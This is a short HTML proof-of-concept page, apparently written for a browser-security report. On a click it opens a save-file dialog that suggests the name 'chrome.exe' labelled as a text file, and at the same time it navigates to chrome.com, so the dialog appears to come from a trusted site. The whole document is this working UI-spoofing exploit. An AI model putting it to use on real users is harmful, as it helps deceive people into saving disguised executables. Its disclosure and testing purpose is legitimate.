<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC</title>
</head>
<body>

<h1>Click anywhere</h1>

<script>
document.addEventListener('click', () => {

    // Trigger Save File Picker after short delay
    setTimeout(async () => {
        if ('showSaveFilePicker' in window) {
            try {
                const handle = await window.showSaveFilePicker({
                    suggestedName: 'chrome.exe',
                    types: [{
                        description: 'Text File',
                        accept: { 'text/plain': ['.txt'] }
                    }]
                });

                const writable = await handle.createWritable();
                await writable.write('Invoice data');
                await writable.close();
            } catch (e) {}
        }
    }, 1000);

    // Navigate to a trusted-looking domain at the same time
    setTimeout(() => {
        window.location.href = 'https://chrome.com';
    }, 1000);

}, { once: true });
</script>

</body>
</html>
